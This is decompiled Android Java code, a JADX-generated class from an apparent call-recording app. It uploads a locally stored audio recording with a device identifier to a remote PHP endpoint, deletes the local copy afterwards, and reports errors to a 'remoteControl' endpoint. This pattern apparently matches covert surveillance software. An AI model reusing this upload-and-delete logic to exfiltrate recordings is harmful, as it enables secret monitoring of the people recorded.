package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.a;
import a.c.e.e;
import a.c.j.c;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import androidx.browser.trusted.sharing.ShareTarget;
import com.app.service.UploadRecordAudioService;
import com.crashlytics.android.Crashlytics;
import java.io.File;
import java.util.HashMap;
import java.util.Map;
import okhttp3.MediaType;
import okhttp3.MultipartBody.Part;
import okhttp3.RequestBody;

/* compiled from: RecordAudioRemote */
public class j implements Runnable {

    /* renamed from: a reason: collision with root package name */
    private final Context f238a;

    /* renamed from: b reason: collision with root package name */
    private String f239b = "RecordAudio";

    /* renamed from: c reason: collision with root package name */
    private boolean f240c;

    public j(Context context, boolean z) {
        this.f238a = context;
        this.f240c = z;
    }

    private void a(Context context) {
        String str = "";
        try {
            if (e.f(context) != 0) {
                String str2 = "RECORDAUDIOERROR";
                String b2 = c.b();
                HashMap hashMap = new HashMap();
                StringBuilder sb = new StringBuilder();
                sb.append(str);
                sb.append(e.e(context));
                hashMap.put("idPhone", sb.toString());
                hashMap.put("dateConnexion", b2);
                hashMap.put("type", this.f239b);
                StringBuilder sb2 = new StringBuilder();
                sb2.append(str);
                sb2.append(e.f(context));
                hashMap.put("idLog", sb2.toString());
                hashMap.put("data", str2);
                long a2 = a.a(e.e(context), b2, this.f239b, e.f(context), str2, context);
                if (a.c.e.a.b("remoteControl/setLog.php", (Map<String, String>) hashMap)) {
                    a.d((int) a2, context);
                }
            }
        } catch (Throwable th) {
            th.getStackTrace();
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(5:0|(3:1|2|(1:4)(2:5|(1:17)(2:9|(2:11|(1:15))(1:16))))|22|23|(2:25|33)(1:32)) */
    /* JADX WARNING: Code restructure failed: missing block: B:26:0x012b, code lost:
        r0 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:28:?, code lost:
        r0.getStackTrace();
        com.crashlytics.android.Crashlytics.logException(r0);
     */
    /* JADX WARNING: Code restructure failed: missing block: B:30:?, code lost:
        return;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:31:?, code lost:
        return;
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:22:0x0103 */
    /* JADX WARNING: Removed duplicated region for block: B:25:0x011c A[Catch:{ all -> 0x012b }] */
    /* JADX WARNING: Removed duplicated region for block: B:32:? A[RETURN, SYNTHETIC] */
    public void run() {
        String str = "idLog";
        String str2 = "";
        try {
            if (this.f240c) {
                a(this.f238a);
            } else if (e.c(this.f238a) == null || e.f(this.f238a) == 0) {
                a(this.f238a);
            } else {
                File file = new File(e.c(this.f238a));
                if (file.exists()) {
                    String b2 = c.b();
                    HashMap hashMap = new HashMap();
                    StringBuilder sb = new StringBuilder();
                    sb.append(str2);
                    sb.append(e.e(this.f238a));
                    hashMap.put("idPhone", com.app.retrofit.a.a(sb.toString()));
                    hashMap.put("dateConnexion", com.app.retrofit.a.a(b2));
                    hashMap.put("type", com.app.retrofit.a.a(this.f239b));
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append(str2);
                    sb2.append(e.f(this.f238a));
                    hashMap.put(str, com.app.retrofit.a.a(sb2.toString()));
                    long a2 = a.a(e.e(this.f238a), b2, this.f239b, e.f(this.f238a), e.c(this.f238a), this.f238a);
                    e.e(this.f238a, (String) null);
                    e.g(this.f238a, 0);
                    Editor edit = this.f238a.getSharedPreferences("user", 0).edit();
                    edit.putInt(str, 0);
                    edit.apply();
                    e.g(this.f238a, 0);
                    if (a.c.e.a.a("recordAudio/setRecordAudio.php", hashMap, Part.createFormData("uploadedfile", file.getName(), RequestBody.create(MediaType.parse(ShareTarget.ENCODING_TYPE_MULTIPART), file))) && a.d((int) a2, this.f238a)) {
                        file.delete();
                    }
                } else {
                    a(this.f238a);
                }
            }
        } catch (Throwable th) {
            th.getStackTrace();
            th.getStackTrace();
            Crashlytics.logException(th);
        }
        UploadRecordAudioService.b();
        StringBuilder sb3 = new StringBuilder();
        sb3.append("UploadRecordAudioService.nbTask : ");
        sb3.append(UploadRecordAudioService.f1287c);
        sb3.toString();
        if (UploadRecordAudioService.f1287c > 0) {
            this.f238a.stopService(new Intent(this.f238a, UploadRecordAudioService.class));
        }
    }
}
